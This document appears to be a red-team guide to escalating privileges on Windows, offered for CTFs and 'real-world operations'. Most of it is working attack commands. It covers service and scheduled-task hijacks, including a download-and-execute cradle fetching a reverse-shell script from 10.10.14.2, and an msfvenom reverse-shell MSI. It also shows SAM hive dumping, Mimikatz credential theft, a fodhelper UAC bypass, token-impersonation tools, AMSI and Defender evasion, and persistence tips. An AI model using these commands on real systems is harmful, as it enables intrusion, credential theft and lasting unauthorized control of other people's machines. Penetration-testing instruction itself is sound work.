---
icon: windows
---

# WindowsPrivEsc

## **Windows PrivEsc for Hackers — From User to SYSTEM**

***

Privilege escalation in Windows is the art of turning a basic user shell into **NT AUTHORITY\SYSTEM**.\
In CTFs and real-world operations, this means full control — registry, processes, passwords, persistence.

This guide equips you with **the methodology, commands, and exploits** needed to escalate privileges on Windows systems like a professional red teamer.

***

### I. 🧩 Core Concepts

| Concept                        | Description                                                                          |
| ------------------------------ | ------------------------------------------------------------------------------------ |
| **User Privilege Levels**      | Standard → Administrator → SYSTEM                                                    |
| **Token**                      | Windows security object used to represent privileges; can be stolen or impersonated. |
| **Service**                    | Background process often running with SYSTEM privileges.                             |
| **UAC (User Account Control)** | Restricts privilege elevation; can be bypassed.                                      |
| **Persistence**                | Maintaining access after escalation (via registry, tasks, etc.).                     |

***

### II. 🧠 Enumeration: Recon Before Exploit

#### 🧩 System Information

```powershell
systeminfo
hostname
whoami /priv
whoami /groups
```

#### 📁 File System Enumeration

```powershell
dir C:\Users
dir /a C:\ProgramData
dir /s *flag*.txt
```

#### 🧰 Privilege Checks

```powershell
whoami /priv
net user
net localgroup administrators
```

#### ⚙️ Service Enumeration

```powershell
sc queryex type=service
wmic service get name,displayname,pathname,startmode
```

#### 🧠 Automated Tools

| Tool             | Purpose                                       |
| ---------------- | --------------------------------------------- |
| **WinPEAS**      | Automated Windows PrivEsc enumeration.        |
| **Seatbelt.exe** | Red Team enumeration and privilege checks.    |
| **PowerUp.ps1**  | PowerShell-based privilege escalation checks. |
| **SharpUp**      | C# enumeration for Windows PrivEsc.           |

***

### III. ⚙️ Common Privilege Escalation Vectors

***

#### 1. 🧩 Misconfigured Services

Services that run as **SYSTEM** but can be **modified by normal users** = instant escalation.

**🔍 Find vulnerable services**

```powershell
wmic service get name,displayname,pathname,startmode
sc qc <servicename>
```

**🔓 Exploit Example**

```powershell
sc config VulnService binpath= "C:\Windows\System32\cmd.exe /c net localgroup administrators user /add"
net start VulnService
```

_Adds your user to the Administrators group._

***

#### 2. ⚙️ Unquoted Service Paths

If a service path contains spaces and no quotes:

```
C:\Program Files\Vulnerable App\Service.exe
```

Windows will execute everything it finds along the path (e.g. `C:\Program.exe`).

**🔍 Check:**

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Program Files"
```

**💣 Exploit:**

```powershell
copy malicious.exe "C:\Program.exe"
net start <servicename>
```

***

#### 3. 🧩 Weak Service Permissions

**🔍 Check Permissions**

```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

If you can modify service binaries or configurations — replace them.

**💥 Replace Service Binary**

```powershell
sc stop VulnService
copy payload.exe "C:\Program Files\VulnService\service.exe"
sc start VulnService
```

***

#### 4. 🧠 Scheduled Tasks

**🔍 Check Tasks**

```powershell
schtasks /query /fo LIST /v
```

If a scheduled task runs as SYSTEM and references a writable file — hijack it.

**💣 Example**

```powershell
echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://10.10.14.2/rev.ps1')" > C:\path\to\task.bat
```

***

#### 5. 💥 AlwaysInstallElevated Exploit

If these registry keys exist and are set to 1:

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**💣 Exploit**

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f msi > exploit.msi
msiexec /quiet /qn /i exploit.msi
```

Gives a SYSTEM-level shell.

***

#### 6. 🔐 Credential Looting

**🔍 Search for Passwords**

```powershell
findstr /si password *.txt *.xml *.ini
```

**🧠 Registry and SAM**

```powershell
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
reg save HKLM\SECURITY security
```

Extract with **secretsdump.py** from Impacket.

**🧰 Mimikatz for Tokens**

```powershell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

***

#### 7. 🧬 UAC Bypass

If UAC is enabled and you’re in **Administrators** group but not SYSTEM.

```powershell
C:\Windows\System32\fodhelper.exe
```

Payload:

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
start fodhelper.exe
```

***

#### 8. 🧰 Token Impersonation (SeImpersonate / SeAssignPrimaryToken)

**🔍 Check Privileges**

```powershell
whoami /priv
```

If you have `SeImpersonatePrivilege`, you can escalate using tools like **PrintSpoofer** or **GodPotato**.

**💣 Exploit Example**

```powershell
PrintSpoofer64.exe -i -c cmd.exe
# or
GodPotato.exe -cmd "cmd.exe"
```

Instant SYSTEM shell.

***

#### 9. 🧩 Writable Binaries or Paths

If you find writable locations in PATH, replace executables executed by SYSTEM services or tasks.

```powershell
Get-ChildItem "C:\Program Files" -Recurse -ErrorAction SilentlyContinue | 
Where-Object {$_.Attributes -match "Archive"} | 
Select-String "C:\\"
```

***

### IV. 🧠 Real-World Workflow Example

```powershell
# Step 1: Basic Recon
whoami
systeminfo
ipconfig /all

# Step 2: Run WinPEAS
winpeas.exe > enum.txt

# Step 3: Analyze
findstr /i "privilege service task" enum.txt

# Step 4: Exploit
PrintSpoofer64.exe -i -c cmd.exe
```

Once SYSTEM:

```powershell
whoami
type C:\Users\Administrator\Desktop\root.txt
```

***

### V. 🧰 Cheatsheet: PrivEsc Summary

| Vector                    | Check                         | Exploit                      |
| ------------------------- | ----------------------------- | ---------------------------- |
| **Misconfigured Service** | `sc qc <service>`             | Replace service binary       |
| **Unquoted Path**         | `wmic service get pathname`   | Add fake exe in path         |
| **Weak Permissions**      | `accesschk.exe`               | Replace service binary       |
| **Scheduled Task**        | `schtasks /query /fo LIST /v` | Overwrite script             |
| **AlwaysInstallElevated** | `reg query HKLM/HKCU`         | Run `.msi` payload           |
| **Token Impersonation**   | `whoami /priv`                | `PrintSpoofer` / `GodPotato` |
| **UAC Bypass**            | `fodhelper.exe`               | Registry hijack              |
| **Stored Credentials**    | `cmdkey /list`                | RDP or PSExec as saved user  |

***

### VI. 🧠 PrivEsc Automation Tools

| Tool                         | Description                                       |
| ---------------------------- | ------------------------------------------------- |
| **WinPEAS**                  | Full system PrivEsc enumeration.                  |
| **PowerUp.ps1**              | Detects and exploits common privilege misconfigs. |
| **Seatbelt**                 | Red Team enumeration utility.                     |
| **SharpUp**                  | C# version of PowerUp for stealth use.            |
| **AccessChk**                | Permission checker from Sysinternals.             |
| **PrintSpoofer / GodPotato** | Token impersonation privilege escalation tools.   |

Example use:

```powershell
winpeas.exe > output.txt
```

***

### VII. 🧠 Pro Tips & Red Team Tactics

* Always **dump credentials** before escalating — you might find easier access.
* **Token privileges** (SeImpersonate, SeAssignPrimaryToken) = 90% success rate.
* Prefer **GodPotato** over **JuicyPotato** (works on modern Windows).
* If Defender blocks PE files, encode PowerShell payloads.
*   Use **PowerShell downgrade**:

    ```powershell
    powershell -Version 2
    ```

    bypasses AMSI on older builds.
* Combine **PowerUp.ps1 + WinPEAS** for maximum coverage.
* After SYSTEM, establish persistence (`schtasks`, registry autoruns, or backdoor service).

***

### VIII. ⚔️ Bonus: PowerShell PrivEsc Template

```powershell
# PowerUp.ps1 Usage Example
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1')
Invoke-AllChecks
```

```powershell
# WinPEAS
Invoke-WebRequest -Uri http://10.10.14.2/winpeas.exe -OutFile winpeas.exe
.\winpeas.exe
```

***
